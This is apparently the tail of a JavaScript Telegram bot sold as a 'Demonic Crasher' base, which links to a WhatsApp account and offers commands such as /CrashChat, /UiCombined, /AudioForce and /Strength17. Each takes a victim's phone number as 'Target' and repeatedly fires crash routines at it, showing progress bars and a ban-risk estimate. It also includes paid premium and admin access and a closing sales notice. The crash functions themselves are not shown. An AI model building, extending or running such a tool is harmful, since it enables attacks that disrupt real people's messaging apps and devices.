        caption: `▢ Target: ${num}
▢ Status: Successfully
▢ Progress: [██████████] 100%

© TRISHULA TRIGER V1`,
      },
      {
        reply_markup: {
          inline_keyboard: [
            [{ text: "CEK TARGET ‼️", url: `https://wa.me/${num}` }],
          ],
        },
      }
    );

  } catch (err) {
    console.error("StepOn Error:", err);
    ctx.reply("❌ Terjadi kesalahan saat eksekusi");
  }
});
bot.command("CrashChat", checkWhatsAppConnection, checkPremium, async (ctx) => {
  try {
    const text = ctx.message?.text || "";
    const q = text.split(" ")[1];
    const userId = ctx.from.id.toString();
    const chatId = ctx.chat.id;

    if (!q) return ctx.reply(`Example: /CrashChat 62xxxx`);

    // Global cooldown
    if (!OWNER_IDS.includes(userId) && isOnGlobalCooldown()) {
      return ctx.reply(`⏳ Sabar Bang\nTunggu ${getGlobalRemaining()} detik lagi`);
    }
    if (!OWNER_IDS.includes(userId)) setGlobalCooldown();

    // Resolve target (AMAN)
    const safe = await resolveTarget(ctx, q);
    if (!safe) return;
    const { sock, num, target } = safe;

    const progressStages = [
      "[░░░░░░░░░░] 0%",
      "[█░░░░░░░░░] 10%",
      "[██░░░░░░░░] 20%",
      "[███░░░░░░░] 30%",
      "[████░░░░░░] 40%",
      "[█████░░░░░] 50%",
      "[██████░░░░] 60%",
      "[███████░░░] 70%",
      "[████████░░] 80%",
      "[█████████░] 90%",
      "[██████████] 100%",
    ];

    const sentMessage = await ctx.replyWithPhoto(getRandomImage(), {
      caption: `▢ Target: ${num}
▢ Resiko Ban : 70%
▢ Status: Processing
▢ Progress: ${progressStages[0]}

© TRISHULA TRIGER V1`,
    });

    // Progress update
    for (let i = 1; i < progressStages.length; i++) {
      await sleep(1500);
      try {
        await ctx.telegram.editMessageCaption(
          chatId,
          sentMessage.message_id,
          undefined,
          `▢ Target: ${num}
▢ Resiko Ban : 60%
▢ Status: Processing
▢ Progress: ${progressStages[i]}

© TRISHULA TRIGER V1`
        );
      } catch {}
    }

    // EXEC
    for (let i = 0; i < 5; i++) {
    await waitIfPaused(target);
    
      await Promise.allSettled([
        YakuzaCrashNotif(target),
        YakuzaCrashNotif(target),
        YakuzaCrashNotif(target),
        YakuzaCrashNotif(target),
      ]);
      await sleep(700);
    }

    // Final update
    await ctx.telegram.editMessageMedia(
      chatId,
      sentMessage.message_id,
      undefined,
      {
        type: "photo",
        media: getRandomImage(),
        caption: `▢ Target: ${num}
▢ Resiko Ban : 60%
▢ Status: Successfully
▢ Progress: [██████████] 100%

© CRMUOZ TRIGER V1`,
      },
      {
        reply_markup: {
          inline_keyboard: [
            [{ text: "CEK TARGET ‼️", url: `https://wa.me/${num}` }],
          ],
        },
      }
    );

  } catch (err) {
    console.error("CrashChat Error:", err);
    ctx.reply("❌ Terjadi kesalahan saat eksekusi");
  }
});
bot.command("UiCombined", checkWhatsAppConnection, checkPremium, async (ctx) => {
  try {
    const text = ctx.message?.text || "";
    const q = text.split(" ")[1];
    const userId = ctx.from.id.toString();
    const chatId = ctx.chat.id;

    if (!q) return ctx.reply(`Example: /UiCombined 62xxxx`);

    // Global cooldown
    if (!OWNER_IDS.includes(userId) && isOnGlobalCooldown()) {
      return ctx.reply(`⏳ Sabar Bang\nTunggu ${getGlobalRemaining()} detik lagi`);
    }
    if (!OWNER_IDS.includes(userId)) setGlobalCooldown();

    // Resolve target (AMAN)
    const safe = await resolveTarget(ctx, q);
    if (!safe) return;
    const { sock, num, target } = safe;

    const progressStages = [
      "[░░░░░░░░░░] 0%",
      "[█░░░░░░░░░] 10%",
      "[██░░░░░░░░] 20%",
      "[███░░░░░░░] 30%",
      "[████░░░░░░] 40%",
      "[█████░░░░░] 50%",
      "[██████░░░░] 60%",
      "[███████░░░] 70%",
      "[████████░░] 80%",
      "[█████████░] 90%",
      "[██████████] 100%",
    ];

    const sentMessage = await ctx.replyWithPhoto(getRandomImage(), {
      caption: `▢ Target: ${num}
▢ Resiko Ban : 50%
▢ Status: Processing
▢ Progress: ${progressStages[0]}

© CRMUOZ TRIGER V1`,
    });

    // Progress update
    for (let i = 1; i < progressStages.length; i++) {
      await sleep(1500);
      try {
        await ctx.telegram.editMessageCaption(
          chatId,
          sentMessage.message_id,
          undefined,
          `▢ Target: ${num}
▢ Resiko Ban : 50%
▢ Status: Processing
▢ Progress: ${progressStages[i]}

© CRMUOZ TRIGER V1`
        );
      } catch {}
    }

    // EXEC
    for (let i = 0; i < 5; i++) {
    await waitIfPaused(target);
    
      await Promise.allSettled([
        SystemUi(sock, target),
        SystemUi(sock, target),
        SystemUi(sock, target),
        SystemUi(sock, target),
      ]);
      await sleep(700);
    }

    // Final update
    await ctx.telegram.editMessageMedia(
      chatId,
      sentMessage.message_id,
      undefined,
      {
        type: "photo",
        media: getRandomImage(),
        caption: `▢ Target: ${num}
▢ Resiko Ban : 50%
▢ Status: Successfully
▢ Progress: [██████████] 100%

© TRISHULA TRIGER V1`,
      },
      {
        reply_markup: {
          inline_keyboard: [
            [{ text: "CEK TARGET ‼️", url: `https://wa.me/${num}` }],
          ],
        },
      }
    );

  } catch (err) {
    console.error("UiCombined Error:", err);
    ctx.reply("❌ Terjadi kesalahan saat eksekusi");
  }
});
bot.command("AudioForce", checkWhatsAppConnection, checkPremium, async (ctx) => {
  try {
    const text = ctx.message?.text || "";
    const q = text.split(" ")[1];
    const userId = ctx.from.id.toString();
    const chatId = ctx.chat.id;

    if (!q) return ctx.reply(`Example: /AudioForce 62xxxx`);

    // Global cooldown
    if (!OWNER_IDS.includes(userId) && isOnGlobalCooldown()) {
      return ctx.reply(`⏳ Sabar Bang\nTunggu ${getGlobalRemaining()} detik lagi`);
    }
    if (!OWNER_IDS.includes(userId)) setGlobalCooldown();

    // Resolve target (AMAN)
    const safe = await resolveTarget(ctx, q);
    if (!safe) return;
    const { sock, num, target } = safe;

    const progressStages = [
      "[░░░░░░░░░░] 0%",
      "[█░░░░░░░░░] 10%",
      "[██░░░░░░░░] 20%",
      "[███░░░░░░░] 30%",
      "[████░░░░░░] 40%",
      "[█████░░░░░] 50%",
      "[██████░░░░] 60%",
      "[███████░░░] 70%",
      "[████████░░] 80%",
      "[█████████░] 90%",
      "[██████████] 100%",
    ];

    const sentMessage = await ctx.replyWithPhoto(getRandomImage(), {
      caption: `▢ Target: ${num}
▢ Resiko Ban : 70%
▢ Status: Processing
▢ Progress: ${progressStages[0]}

© CRMUOZ TRIGER V1`,
    });

    // Progress update
    for (let i = 1; i < progressStages.length; i++) {
      await sleep(1500);
      try {
        await ctx.telegram.editMessageCaption(
          chatId,
          sentMessage.message_id,
          undefined,
          `▢ Target: ${num}
▢ Resiko Ban : 70%
▢ Status: Processing
▢ Progress: ${progressStages[i]}

© CRMUOZ TRIGER V1`
        );
      } catch {}
    }

    // EXEC
    for (let i = 0; i < 5; i++) {
    await waitIfPaused(target);
    
      await Promise.allSettled([
        Bufferfrom(target),
        Bufferfrom(target),
        Bufferfrom(target),
        Bufferfrom(target),
      ]);
      await sleep(700);
    }

    // Final update
    await ctx.telegram.editMessageMedia(
      chatId,
      sentMessage.message_id,
      undefined,
      {
        type: "photo",
        media: getRandomImage(),
        caption: `▢ Target: ${num}
▢ Resiko Ban : 70%
▢ Status: Successfully
▢ Progress: [██████████] 100%

© CRMUOZ TRIGER V1`,
      },
      {
        reply_markup: {
          inline_keyboard: [
            [{ text: "CEK TARGET ‼️", url: `https://wa.me/${num}` }],
          ],
        },
      }
    );

  } catch (err) {
    console.error("AudioForce Error:", err);
    ctx.reply("❌ Terjadi kesalahan saat eksekusi");
  }
});
bot.command("Strength17", checkWhatsAppConnection, checkPremium, async (ctx) => {
  try {
    const text = ctx.message?.text || "";
    const q = text.split(" ")[1];
    const userId = ctx.from.id.toString();
    const chatId = ctx.chat.id;

    if (!q) return ctx.reply(`Example: /Strength17 62xxxx`);

    // Global cooldown
    if (!OWNER_IDS.includes(userId) && isOnGlobalCooldown()) {
      return ctx.reply(`⏳ Sabar Bang\nTunggu ${getGlobalRemaining()} detik lagi`);
    }
    if (!OWNER_IDS.includes(userId)) setGlobalCooldown();

    // Resolve target (AMAN)
    const safe = await resolveTarget(ctx, q);
    if (!safe) return;
    const { sock, num, target } = safe;

    const progressStages = [
      "[░░░░░░░░░░] 0%",
      "[█░░░░░░░░░] 10%",
      "[██░░░░░░░░] 20%",
      "[███░░░░░░░] 30%",
      "[████░░░░░░] 40%",
      "[█████░░░░░] 50%",
      "[██████░░░░] 60%",
      "[███████░░░] 70%",
      "[████████░░] 80%",
      "[█████████░] 90%",
      "[██████████] 100%",
    ];

    const sentMessage = await ctx.replyWithPhoto(getRandomImage(), {
      caption: `▢ Target: ${num}
▢ Resiko Ban : 60%
▢ Status: Processing
▢ Progress: ${progressStages[0]}

© CRMUOZ TRIGER v1`,
    });

    // Progress update
    for (let i = 1; i < progressStages.length; i++) {
      await sleep(1500);
      try {
        await ctx.telegram.editMessageCaption(
          chatId,
          sentMessage.message_id,
          undefined,
          `▢ Target: ${num}
▢ Resiko Ban : 60%
▢ Status: Processing
▢ Progress: ${progressStages[i]}

© CRMUOZ TRIGER v1`
        );
      } catch {}
    }

    // EXEC
    for (let i = 0; i < 5; i++) {
    await waitIfPaused(target);
    
      await Promise.allSettled([
        function1(target),
        function1(target),
        function7(target),
        function7(target),
      ]);
      await sleep(700);
    }

    // Final update
    await ctx.telegram.editMessageMedia(
      chatId,
      sentMessage.message_id,
      undefined,
      {
        type: "photo",
        media: getRandomImage(),
        caption: `▢ Target: ${num}
▢ Resiko Ban : 60%
▢ Status: Successfully
▢ Progress: [██████████] 100%

© CRMUOZ TRIGER v1`,
      },
      {
        reply_markup: {
          inline_keyboard: [
            [{ text: "CEK TARGET ‼️", url: `https://wa.me/${num}` }],
          ],
        },
      }
    );

  } catch (err) {
    console.error("Strength17 Error:", err);
    ctx.reply("❌ Terjadi kesalahan saat eksekusi");
  }
});
//setjedanya
bot.command("setcd", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ");
  const duration = parseDuration(args);

  if (!duration) {
    return ctx.reply("❌ Contoh: /setcd 50s | /setcd 1 menit");
  }

  setGlobalDuration(duration);
  ctx.reply(`✅ Global cooldown diset ke ${args}`);
});
// Perintah untuk menambahkan pengguna premium (hanya owner)
bot.command("addadmin", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply(
      "❌ Format Salah!. Example: /Addadmin 12345678"
    );
  }

  const userId = args[1];

  if (adminUsers.includes(userId)) {
    return ctx.reply(`✅ bocah ${userId} sudah memiliki status admin.`);
  }

  adminUsers.push(userId);
  saveJSON(adminFile, adminUsers);

  return ctx.reply(`✅ bocah ${userId} sekarang memiliki akses admin!`);
});
bot.command("addprem", checkOwner, checkAdmin, (ctx) => {
  const args = ctx.message.text.trim().split(" "); 

  if (args.length < 2) {
    return ctx.reply("❌ Format Salah!. Example : /addprem 12345678");
  }

  const userId = args[1].toString();

  if (premiumUsers.includes(userId)) {
    return ctx.reply(`✅ kacung ${userId} sudah memiliki akses premium.`);
  }

  premiumUsers.push(userId);
  saveJSON(premiumFile, premiumUsers);

  return ctx.reply(`✅ anak ${userId} kacung sekarang adalah premium.`);
});
///=== comand del admin ===\\\
bot.command("deladmin", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply(
      "❌ Format Salah!. Example : /deladmin 12345678"
    );
  }

  const userId = args[1];

  if (!adminUsers.includes(userId)) {
    return ctx.reply(`❌ wkwkw ${userId} tidak ada dalam daftar Admin.`);
  }

  adminUsers = adminUsers.filter((id) => id !== userId);
  saveJSON(adminFile, adminUsers);

  return ctx.reply(`🚫 mampus ${userId} telah dihapus dari daftar Admin.`);
});
bot.command("delprem", checkOwner, checkAdmin, (ctx) => {
  const args = ctx.message.text.trim().split(" ");

  if (args.length < 2) {
    return ctx.reply(
      "❌ Format Salah!. Example : /delprem 12345678"
    );
  }

  const userId = args[1].toString();

  if (!premiumUsers.includes(userId)) {
    return ctx.reply(`❌ wkwkw ${userId} tidak ada dalam daftar premium.`);
  }

  premiumUsers = premiumUsers.filter((id) => id !== userId);
  saveJSON(premiumFile, premiumUsers);

  return ctx.reply(`🚫 mampus ${userId} telah dihapus dari akses premium.`);
});

// Perintah untuk mengecek status premium
bot.command("cekprem", (ctx) => {
  const userId = ctx.from.id.toString();

  if (premiumUsers.includes(userId)) {
    return ctx.reply(`✅ anak kacung sudah menjadi premium.`);
  } else {
    return ctx.reply(`❌ lawak bego lu bukan pengguna premium.`);
  }
});

bot.command("addpairing", checkOwner, async (ctx) => {
  try {
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
      return ctx.reply("❌ Format salah\nContoh: /addpairing 628xxxx");
    }

    let phoneNumber = args[1].replace(/[^0-9]/g, "");

    // kalau WA sudah connect, tolak
    if (global.sock && global.sock.user) {
      return ctx.reply(
        "╔══════════════════════════╗\n" +
        "║ ✅ 𝗪𝗛𝗔𝗧𝗦𝗔𝗣𝗣 𝗔𝗞𝗧𝗜𝗙 ║\n" +
        "╠══════════════════════════╣\n" +
        "║ 📱 WhatsApp sudah connect║\n" +
        "║ ❌ Tidak perlu pairing   ║\n" +
        "╚══════════════════════════╝"
      );
    }

    // pastikan socket ada
    if (!global.sock) {
      return ctx.reply("⏳ Socket belum siap, tunggu sebentar lalu coba lagi");
    }

    // request pairing code
    const code = await global.sock.requestPairingCode(phoneNumber);
    const formattedCode = code.match(/.{1,4}/g).join("-");

    await ctx.replyWithPhoto(
      getRandomImage(),
      {
        caption:
          "╔══════════════════════════╗\n" +
          "║ 📲 𝗪𝗛𝗔𝗧𝗦𝗔𝗣𝗣 𝗣𝗔𝗜𝗥𝗜𝗡𝗚 ║\n" +
          "╠══════════════════════════╣\n" +
          `║ 📞 Nomor : ${phoneNumber}\n` +
          `║ 🔑 Code  : ${formattedCode}\n` +
          "╠══════════════════════════╣\n" +
          "║ 📌 Masukkan kode ini di  ║\n" +
          "║ 📱 WhatsApp Anda         ║\n" +
          "╠══════════════════════════╣\n" +
          "║ 👑 CRMUOZ TRIGER       ║\n" +
          "╚══════════════════════════╝",
        parse_mode: "HTML"
      }
    );

  } catch (err) {
    console.error("PAIRING ERROR:", err);
    ctx.reply("❌ Gagal membuat pairing code");
  }
});
/////////// DEL SESION \\\\\\\\\
bot.command("delsesi", checkOwner, async (ctx) => {
  try {
    // 1. Logout & matikan socket kalau masih ada
    if (global.sock) {
      try {
        await global.sock.logout()
      } catch {}
      global.sock.ev?.removeAllListeners()
      global.sock = null
    }

    // 2. Reset status
    isWhatsAppConnected = false

    // 3. Hapus folder session
    const sessionPath = "./session"
    if (fs.existsSync(sessionPath)) {
      fs.rmSync(sessionPath, { recursive: true, force: true })
    }

    // 4. Info ke user
    await ctx.reply(
      "✅ Session berhasil dihapus\n🔄 Silahkan /addpairing Ulang Untuk Menggunakan Command Whatsapp..."
    )

    // 5. Start ulang sesi WA
    setTimeout(() => {
      startSesi()
    }, 2000)

  } catch (err) {
    console.error("DELSESI ERROR:", err)
    ctx.reply("❌ Gagal menghapus session")
  }
})
////////// OWNER MENU \\\\\\\\\
bot.command("status", checkVerified, async (ctx) => {
  try {
    const sock = global.sock;

    if (!sock || !sock.user) {
      return ctx.reply("❌ WhatsApp belum diinisialisasi atau belum login");
    }

    if (sock.ws?.readyState !== 1) {
      return ctx.reply("⏳ WhatsApp sedang menghubungkan...");
    }

    // Ambil nomor WA dari socket
    const linkedWhatsAppNumber = sock.user?.id?.split(":")[0] || "-";

    // Fungsi getUptime() harus sudah ada, kalau belum bikin simple version:
    // const getUptime = () => process.uptime(); // dalam detik

    return ctx.reply(
      `✅ WhatsApp Aktif
📱 Nomor: ${linkedWhatsAppNumber}
⏱ Uptime: ${getUptime()}`
    );
  } catch (err) {
    console.error("STATUS ERROR:", err);
    return ctx.reply("❌ Gagal mengambil status WhatsApp");
  }
});
bot.command("listpairing", checkOwner, async (ctx) => {
  try {
    const sock = global.sock;

    if (!sock || !sock.user) {
      return ctx.reply("❌ WhatsApp belum login");
    }

    const number = sock.user.id.split(":")[0];

    ctx.reply(
`📲 *PAIRING STATUS*

✅ WhatsApp Terhubung
📱 Nomor: ${number}
🖥 Mode: Multi-Device
🔐 Auth: Session Aktif

⚠️ WhatsApp Terhubung 

© CRMUOZ TRIGER V1`,
      { parse_mode: "HTML" }
    );

  } catch (e) {
    ctx.reply("❌ Gagal mengambil status pairing");
  }
});
/////////////////END/////////////////////////
// FUNCTION AMPAS LU DI SINI 😹
///////////////////[FUNC BUG]////////////////
// ===== AKTIFKAN OWNER COMMAND =====
bot.use(owner);
// • • • • • JALANKAN BOT • • • • • \\
(async () => {
  try {
    console.log("🚀 Memulai sesi WhatsApp...");
    await startSesi();

    console.log("🤖 Menjalankan Telegram Bot...");
    await bot.launch({ dropPendingUpdates: true });

    console.log("✅ Telegram Bot ONLINE");
  } catch (err) {
    console.error("❌ Gagal memulai bot:", err);
    process.exit(1);
  }
})();
/*
Hello Buyer Base Demonic Crasher By Rozzy Official
Notes : Buat All Buyer
No Kasih Free Org Ya.
No Share Publik Ya.
No Jual Ya.
No Jual No Enc Ya.
Bebas Rename Ya.
Base Ini Versi Telegraf Ya.
NO HAPUS CREATE BY ROZZY OFFICIAL.

Base Ini Di Rancang Oleh Rozzy Official Untuk Membantu Kalian Membuat Script Bot Vis Telegram
Base Ini Base Demonic Crasher Version 15 Di Tahun 2026 Awal Ya Gays.
Base Ini Sudah Ada Fitur Setjeda, Password, Tools, Bug Telegram, Dll

20k = Free Isi Fitur Seperti Bug Telegram, Tools.

CREATE BY ROZZY ~ @RZOKISAP

#Respect
*/